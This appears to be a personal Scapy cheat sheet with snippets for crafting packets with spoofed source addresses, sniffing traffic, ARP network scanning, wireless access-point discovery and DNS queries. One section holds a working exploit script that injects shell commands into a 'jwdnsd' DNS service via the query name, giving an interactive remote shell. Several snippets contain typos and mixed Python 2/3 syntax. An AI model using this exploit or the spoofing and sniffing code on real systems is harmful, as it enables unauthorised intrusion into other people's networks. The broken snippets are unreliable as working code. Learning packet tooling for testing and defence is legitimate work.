
#---------------------------  Download & Install  ---------------------------
"https://github.com/secdev/scapy/releases

> python setup.py install"
> scapy
> pip install --pre scapy[basic]

#---------------------------  Commands  ---------------------------
>>> ls(Ether)
>>> ls(IP)
>>> ls(TCP)
>>> ls(ICMP)

>>> myPacket1 = IP(dst=”192.168.1.99”)
>>> myPacket1 = IP(dst=”192.168.1.99”, src=”90.90.90.90”)
>>> myPacket1/=TCP(dport=445)
>>> myPacket1.show
>>> sr1(myPacket1)

>>> myPacket2 = IP(src=”192.168.1.88”, dst=”192.168.1.99”)
>>> myPacket2/ = ICMP(type=8, code=0)
>>> sr1(myPacket2)

>>> myPacket3=IP(src=”7.7.7.7”, dst=”190.168.1.99”)
>>> myPacket3/=TCP(dport=445)
>>> myPacket3/=RAW(load=”alireza”)
>>> sr1(myPacket3)

>>> send (packet)
>>> sendp (packet)
>>> sr1 (packet)
>>> srp (packet)
>>> srp1 (packet)

>>> ans,unans = sr1(packet)
>>> ans.show()
>>> unans.show()

python -c “...”

>>> packets = sniff()
>>> packets = sniff(count=10)
>>> packets = sniff(iface=”eth0”)
>>> packets = sniff(filter=”port 80”)
>>> packets = sniff(filter=”icmp”)
>>> packets.summary()"

>>> wrpcap(“test.pcap”, packets)
>>> packet2 = rdpcap(“test.pcap”)
>>> packet2
>>> packet2.show()
>>> packet2.summary()

#---------------------------  Scapy in Python - ARP  ---------------------------
from scapy.all import srp, Ether, ARP, conf
import sys

if len(sys.argv) != 2:
    print ("usage: arp.py Network")
    print("Example: arp.py 192.168.1.0/24")
    sys.exit()

conf.verb = 0

ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=sys.argv[1]), timeout=2)
for s, r in ans:
    print(r.sprintf("%Ether:src% %ARP.psrc%"))
    
#---------------------------  Scapy in Python - Wireless  ---------------------------
from scapy.all import *

ap_list = []

def packethandler(pkt):
    if pkt.haslayer(Dot11):
        if pkt.type == 0 and pkt.subtype == 8:
            if pkt.addr2 not in ap_list:
                ap_list.append(pkt.addr2)
                print("AP MAC: %s with SSID: %s" %(pkt.addr2, pkt.info))

sniff(iface="wlan0", prn= packethandler)

#---------------------------  DNS  ---------------------------
>>> header = IP(dst="8.8.8.8")/UDP(dpor=53)
>>> payload = DNS(rd=1, qd=DNSQR(qname="www.google.com"))
>>> payload = DNS(rd=1, qd=DNSQR(qname="www.google.com", qtype=32))
>>> ans = sr1(header/payload)
>>> show.ans

#---------------------------  Scapy in Python - DNS Exploit  ---------------------------
import sys
from scapy.all import *
conf.iface="eth0"

print("jwdnsd-rci.py - Exploit jwdnsd vulnerability.")
if len(sys.argv) != 2:
    print "Usage: jwdnsd-rci.py [target IP]"
    sys.exit(0)

header = IP(dst=sys.argv[1])/UDP(dport=53)

while(True):
    try:
        cmd=raw_input('> ')
    except (EOFError,KeyboardInterrupt) as e:
        print
        sys.exit(0)

    payload = DNS(rd=1,qd=DNSQR(qname=";"+cmd,qtype=32))
    ans=sr1(header/payload,verbose=0,timeout=3)
    if ans is not None and Raw in ans:
        print str(ans[Raw]).split("\x00\x00\x00\x3c")[1][2:]
        
#---------------------------  Scapy in Python - ARP  ---------------------------
from scapy.all import *

def packethandler(pkt):
    if pkt.haslayer(ARP):
        print (pkt.hwsrc)

sniff(iface="eth0", prn=packethandler)
